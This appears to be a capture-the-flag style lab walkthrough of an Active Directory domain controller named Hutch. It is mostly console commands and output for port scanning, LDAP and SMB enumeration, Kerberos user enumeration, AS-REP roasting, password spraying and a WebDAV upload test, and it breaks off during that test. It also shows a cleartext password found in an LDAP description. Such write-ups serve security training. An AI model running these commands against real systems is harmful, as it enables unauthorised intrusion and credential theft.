# Recon


```console
──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# nmap -Pn -sT -sV -n -p- --min-rate 1000 --max-retries 2 192.168.240.122                                                                                                            130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-24 21:31 EST
Warning: 192.168.240.122 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.240.122
Host is up (0.34s latency).
Not shown: 65522 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  unknown
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  unknown
49688/tcp open  unknown
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# nmap -Pn -sT -sV -n -sC -p 53,80,135,139,389,445 192.168.240.122
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-24 21:39 EST
Nmap scan report for 192.168.240.122
Host is up (0.10s latency).

PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-webdav-scan: 
|   Server Date: Tue, 25 Jan 2022 02:39:24 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-25T02:39:25
|_  start_date: N/A

```

## HTTP tcp/80


![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Hutch/img/1.png)

```console                                                                                                                                                                                             
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# nmap -Pn -sT -sV -n --script http-enum -p 80 192.168.240.122
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-24 21:41 EST
Stats: 0:04:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.73% done; ETC: 21:45 (0:00:06 remaining)                                                                                                                                
Nmap scan report for 192.168.240.122                                                                                                                                                         
Host is up (0.17s latency).                                                                                                                                                                  
                                                                                                                                                                                             
PORT   STATE SERVICE VERSION                                                                                                                                                                 
80/tcp open  http    Microsoft IIS httpd 10.0                                                                                                                                                
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                     
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                     
                                                                                                                                                                                             
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                               
Nmap done: 1 IP address (1 host up) scanned in 339.07 seconds
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# cadaver http://192.168.240.122                                        
Authentication required for 192.168.240.122 on server `192.168.240.122':
Username: admin
Password: 
Authentication required for 192.168.240.122 on server `192.168.240.122':
Username: 
Password: 
Could not access / (not WebDAV-enabled?):
Could not authenticate to server: rejected Basic challenge
Connection to `192.168.240.122' closed.
dav:!> 
```



## SMB tcp/445

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# nmap -Pn -sT -n --script smb-enum-shares.nse 192.168.240.122 -p 135,139,445                                                                                                         26 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-24 22:00 EST
Nmap scan report for 192.168.240.122
Host is up (0.12s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 4.03 seconds
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# nmap -Pn -sT -n --script smb-vuln-ms17-010 192.168.240.122 -p 135,139,445
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-24 22:01 EST
Nmap scan report for 192.168.240.122
Host is up (0.10s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.51 seconds
```                                                                  

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# smbmap -H 192.168.240.122                                                                  
[+] IP: 192.168.240.122:445     Name: 192.168.240.122      
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# smbmap -H 192.168.240.122 -u 'Guest' 
[!] Authentication error on 192.168.240.122
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# smbclient  -L 192.168.240.122 -N        
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```



## DNS tcp/53

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# dig @192.168.240.122 hutch.offsec

; <<>> DiG 9.16.15-Debian <<>> @192.168.240.122 hutch.offsec
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15748
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;hutch.offsec.                  IN      A

;; ANSWER SECTION:
hutch.offsec.           600     IN      A       192.168.120.108

;; Query time: 103 msec
;; SERVER: 192.168.240.122#53(192.168.240.122)
;; WHEN: Mon Jan 24 23:21:08 EST 2022
;; MSG SIZE  rcvd: 57
```

## kerberoast tcp/88

### Enumerate Users
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# impacket-GetADUsers -all  hutch.offsec/ -dc-ip 192.168.240.122                                                                                                                       1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Querying 192.168.240.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Guest                                                 <never>              <never>             
rplacidi                                              2020-11-04 00:35:05.106274  <never>             
opatry                                                2020-11-04 00:35:05.216273  <never>             
ltaunton                                              2020-11-04 00:35:05.264272  <never>             
acostello                                             2020-11-04 00:35:05.315273  <never>             
jsparwell                                             2020-11-04 00:35:05.377272  <never>             
oknee                                                 2020-11-04 00:35:05.433274  <never>             
jmckendry                                             2020-11-04 00:35:05.492273  <never>             
avictoria                                             2020-11-04 00:35:05.545279  <never>             
jfrarey                                               2020-11-04 00:35:05.603273  <never>             
eaburrow                                              2020-11-04 00:35:05.652273  <never>             
cluddy                                                2020-11-04 00:35:05.703274  <never>             
agitthouse                                            2020-11-04 00:35:05.760273  <never>             
fmcsorley                                             2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491 
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# for user in $(impacket-GetADUsers -all  hutch.offsec/ -dc-ip 192.168.240.122 | awk '{ print $1 }' | tail -n 14); do echo "$user" && smbmap -H 192.168.240.122 -u "$user" -p ""; done
Guest
[!] Authentication error on 192.168.240.122
rplacidi
[!] Authentication error on 192.168.240.122
opatry
[!] Authentication error on 192.168.240.122
ltaunton
[!] Authentication error on 192.168.240.122
acostello
[!] Authentication error on 192.168.240.122
jsparwell
[!] Authentication error on 192.168.240.122
oknee
[!] Authentication error on 192.168.240.122
jmckendry
[!] Authentication error on 192.168.240.122
avictoria
[!] Authentication error on 192.168.240.122
jfrarey
[!] Authentication error on 192.168.240.122
eaburrow
[!] Authentication error on 192.168.240.122
cluddy
[!] Authentication error on 192.168.240.122
agitthouse
[!] Authentication error on 192.168.240.122
fmcsorley
[!] Authentication error on 192.168.240.122
```                                         
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# for user in $(impacket-GetADUsers -all  hutch.offsec/ -dc-ip 192.168.240.122 | awk '{ print $1 }' | tail -n 14); do echo "$user" && rpcclient -U "$user" -N 192.168.240.122 ; done
Guest
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
rplacidi
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
opatry
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
ltaunton
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
acostello
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
jsparwell
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
oknee
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
jmckendry
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
avictoria
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
jfrarey
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
eaburrow
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
cluddy
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
agitthouse
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
fmcsorley
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# kerbrute userenum --domain hutch.offsec /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 192.168.240.122                    130 ⨯

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/24/22 - Ronnie Flathers @ropnop

2022/01/24 22:52:24 >  Using KDC(s):
2022/01/24 22:52:24 >   192.168.240.122:88

2022/01/24 22:52:24 >  [+] VALID USERNAME:       admin@hutch.offsec
2022/01/24 22:52:44 >  [+] VALID USERNAME:       administrator@hutch.offsec
2022/01/24 22:52:46 >  [+] VALID USERNAME:       Admin@hutch.offsec
2022/01/24 22:54:59 >  [+] VALID USERNAME:       Administrator@hutch.offsec
^C^F
```

### ASPREPRoast Attack
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# impacket-GetNPUsers hutch.offsec/ -usersfile users.txt -format john -outputfile hash.txt -dc-ip 192.168.240.122     
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User rplacidi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User opatry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ltaunton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User acostello doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsparwell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oknee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jmckendry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User avictoria doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jfrarey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eaburrow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cluddy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User agitthouse doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fmcsorley doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Enum shares
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# while read line; do echo "$line" && echo '\n' | smbclient -L 192.168.240.122 -U hutch.offsec/$line ; done < users.txt
hutch
Enter HUTCH.OFFSEC\hutch's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
admin
Enter HUTCH.OFFSEC\admin's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
administrator
Enter HUTCH.OFFSEC\administrator's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
Guest
Enter HUTCH.OFFSEC\Guest's password: 
session setup failed: NT_STATUS_ACCOUNT_DISABLED
rplacidi
Enter HUTCH.OFFSEC\rplacidi's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
opatry
Enter HUTCH.OFFSEC\opatry's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
ltaunton
Enter HUTCH.OFFSEC\ltaunton's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
acostello
Enter HUTCH.OFFSEC\acostello's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
jsparwell
Enter HUTCH.OFFSEC\jsparwell's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
oknee
Enter HUTCH.OFFSEC\oknee's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
jmckendry
Enter HUTCH.OFFSEC\jmckendry's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
avictoria
Enter HUTCH.OFFSEC\avictoria's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
jfrarey
Enter HUTCH.OFFSEC\jfrarey's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
eaburrow
Enter HUTCH.OFFSEC\eaburrow's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
cluddy
Enter HUTCH.OFFSEC\cluddy's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
agitthouse
Enter HUTCH.OFFSEC\agitthouse's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
fmcsorley
Enter HUTCH.OFFSEC\fmcsorley's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

### Brute force 
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# python /opt/kerbrute/kerbrute.py -domain hutch.offsec -users users.txt -passwords users.txt -dc-ip 192.168.240.122
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Valid user => admin
[*] Valid user => administrator
[*] Blocked/Disabled user => Guest
[*] Valid user => rplacidi
[*] Valid user => opatry
[*] Valid user => ltaunton
[*] Valid user => acostello
[*] Valid user => jsparwell
[*] Valid user => oknee
[*] Valid user => jmckendry
[*] Valid user => avictoria
[*] Valid user => jfrarey
[*] Valid user => eaburrow
[*] Valid user => cluddy
[*] Valid user => agitthouse
[*] Valid user => fmcsorley
[*] No passwords were discovered :'(
```




## LDAP

https://book.hacktricks.xyz/pentesting/pentesting-ldap

```console
nmap -n -sV --script "ldap* and not brute" 192.168.240.122
```

### Enumerate Users
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# ldapsearch -x -h 192.168.240.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName 
sAMAccountName: Guest
sAMAccountName: Domain Computers
sAMAccountName: Cert Publishers
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
sAMAccountName: Protected Users
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: rplacidi
sAMAccountName: opatry
sAMAccountName: ltaunton
sAMAccountName: acostello
sAMAccountName: jsparwell
sAMAccountName: oknee
sAMAccountName: jmckendry
sAMAccountName: avictoria
sAMAccountName: jfrarey
sAMAccountName: eaburrow
sAMAccountName: cluddy
sAMAccountName: agitthouse
sAMAccountName: fmcsorley
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# ldapsearch -x -h 192.168.240.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description     130 ⨯
description: Built-in account for guest access to the computer/domain
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all 
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Password set to CrabSharkJellyfish192 at user's request. Please c
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# impacket-GetADUsers -all  hutch.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip 192.168.240.122   
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Querying 192.168.240.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2022-01-24 21:29:24.443041  2020-11-04 00:58:40.654236 
Guest                                                 <never>              <never>             
krbtgt                                                2020-11-04 00:26:23.099902  <never>             
rplacidi                                              2020-11-04 00:35:05.106274  <never>             
opatry                                                2020-11-04 00:35:05.216273  <never>             
ltaunton                                              2020-11-04 00:35:05.264272  <never>             
acostello                                             2020-11-04 00:35:05.315273  <never>             
jsparwell                                             2020-11-04 00:35:05.377272  <never>             
oknee                                                 2020-11-04 00:35:05.433274  <never>             
jmckendry                                             2020-11-04 00:35:05.492273  <never>             
avictoria                                             2020-11-04 00:35:05.545279  <never>             
jfrarey                                               2020-11-04 00:35:05.603273  <never>             
eaburrow                                              2020-11-04 00:35:05.652273  <never>             
cluddy                                                2020-11-04 00:35:05.703274  <never>             
agitthouse                                            2020-11-04 00:35:05.760273  <never>             
fmcsorley                                             2020-11-04 00:35:05.815275  2022-01-25 00:24:11.630698 
domainadmin                                           2021-02-16 00:24:22.190351  2022-01-24 21:26:43.646154 
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# crackmapexec smb 192.168.240.122 -u fmcsorley -p CrabSharkJellyfish192
SMB         192.168.240.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.240.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
```

### Enumerate Users, Groups

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─#  ldapdomaindump -u 'hutch.offsec\fmcsorley' -p 'CrabSharkJellyfish192' 192.168.240.122                   1 ⨯
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Hutch/img/2.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Hutch/img/3.png)

### Kerboroasting


```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# impacket-GetUserSPNs -request 'hutch.offsec/fmcsorley:CrabSharkJellyfish192' -dc-ip 192.168.240.122
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

No entries found!
```


### Share 
          
```console                                                                                                                                                    
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# crackmapexec smb 192.168.240.122 -u fmcsorley -p CrabSharkJellyfish192 --shares
SMB         192.168.240.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.240.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
SMB         192.168.240.122 445    HUTCHDC          [+] Enumerated shares
SMB         192.168.240.122 445    HUTCHDC          Share           Permissions     Remark
SMB         192.168.240.122 445    HUTCHDC          -----           -----------     ------
SMB         192.168.240.122 445    HUTCHDC          ADMIN$                          Remote Admin
SMB         192.168.240.122 445    HUTCHDC          C$                              Default share
SMB         192.168.240.122 445    HUTCHDC          IPC$            READ            Remote IPC
SMB         192.168.240.122 445    HUTCHDC          NETLOGON        READ            Logon server share 
SMB         192.168.240.122 445    HUTCHDC          SYSVOL          READ            Logon server share 
```
```console

┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# smbmap -H 192.168.240.122 -d 'hutch.offsec' -u 'fmcsorley' -p 'CrabSharkJellyfish192'
[+] IP: 192.168.240.122:445     Name: hutch.offsec                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# smbclient  //192.168.240.122/SYSVOL -U "fmcsorley%CrabSharkJellyfish192"                                                                             32 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Nov  4 00:25:31 2020
  ..                                  D        0  Wed Nov  4 00:25:31 2020
  hutch.offsec                       Dr        0  Wed Nov  4 00:25:31 2020

                7706623 blocks of size 4096. 3580988 blocks available
smb: \> 
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# smbclient  //192.168.240.122/SYSVOL -U "fmcsorley%CrabSharkJellyfish192"                                                                             32 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Nov  4 00:25:31 2020
  ..                                  D        0  Wed Nov  4 00:25:31 2020
  hutch.offsec                       Dr        0  Wed Nov  4 00:25:31 2020

                7706623 blocks of size 4096. 3580988 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \hutch.offsec\DfsrPrivate\*
getting file \hutch.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as hutch.offsec/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \hutch.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 23 as hutch.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \hutch.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2786 as hutch.offsec/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (6.6 KiloBytes/sec) (average 2.3 KiloBytes/sec)
getting file \hutch.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\comment.cmtx of size 575 as hutch.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/comment.cmtx (1.4 KiloBytes/sec) (average 2.0 KiloBytes/sec)
getting file \hutch.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Registry.pol of size 148 as hutch.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Registry.pol (0.4 KiloBytes/sec) (average 1.7 KiloBytes/sec)
getting file \hutch.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1096 as hutch.offsec/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.6 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \hutch.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 6178 as hutch.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (14.8 KiloBytes/sec) (average 3.7 KiloBytes/sec)
smb: \> 
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch/hutch.offsec]
└─# find . -type f 2>/dev/null | xargs file | grep -v open
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol:      data
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI:                   ASCII text, with CRLF line terminators
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/comment.cmtx:      XML 1.0 document, UTF-8 Unicode (with BOM) text, with CRLF line terminators
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Registry.pol:      data
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI:                   ASCII text, with CRLF line terminators
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch/hutch.offsec]
└─# cat ./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Registry.pol
PReg[Software\Policies\Microsoft Services\AdmPwd;AdmPwdEnabled;;;]       
```

### Brute Force


```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# python /opt/kerbrute/kerbrute.py -domain hutch.offsec -users users-2.txt -passwords users-2.txt -dc-ip 192.168.240.122
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Valid user => Administrator
[*] Blocked/Disabled user => Guest
[*] Blocked/Disabled user => krbtgt
[*] Valid user => rplacidi
[*] Valid user => opatry
[*] Valid user => ltaunton
[*] Valid user => acostello
[*] Valid user => jsparwell
[*] Valid user => oknee
[*] Valid user => jmckendry
[*] Valid user => avictoria
[*] Valid user => jfrarey
[*] Valid user => eaburrow
[*] Valid user => cluddy
[*] Valid user => agitthouse
[*] Valid user => fmcsorley
[*] Valid user => domainadmin
[*] Stupendous => fmcsorley:CrabSharkJellyfish192
[*] Saved TGT in fmcsorley.ccache

```


#cat /usr/share/wordlists/rockyou.txt | grep -n -P "[\x80-\xFF]" 

## HTTP tcp/80

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# davtest -url http://192.168.240.122 -auth fmcsorley:CrabSharkJellyfish192
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://192.168.240.122
********************************************************
NOTE    Random string for this session: ckRsG6d
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://192.168.240.122/DavTestDir_ckRsG6d
********************************************************
 Sending test files
PUT     php     SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.php
PUT     aspx    SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.aspx
PUT     pl      SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.pl
PUT     asp     SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.asp
PUT     jhtml   SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.jhtml
PUT     cgi     SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.cgi
PUT     jsp     SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.jsp
PUT     cfm     SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.cfm
PUT     shtml   SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.shtml
PUT     html    SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.html
PUT     txt     SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.txt
********************************************************
 Checking for test file execution
EXEC    php     FAIL
EXEC    aspx    SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.aspx
EXEC    pl      FAIL
EXEC    asp     SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.asp
EXEC    jhtml   FAIL
EXEC    cgi     FAIL
EXEC    jsp     FAIL
EXEC    cfm     FAIL
EXEC    shtml   FAIL
EXEC    html    SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.html
EXEC    txt     SUCCEED:        http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.txt

********************************************************
/usr/bin/davtest Summary:
Created: http://192.168.240.122/DavTestDir_ckRsG6d
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.php
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.aspx
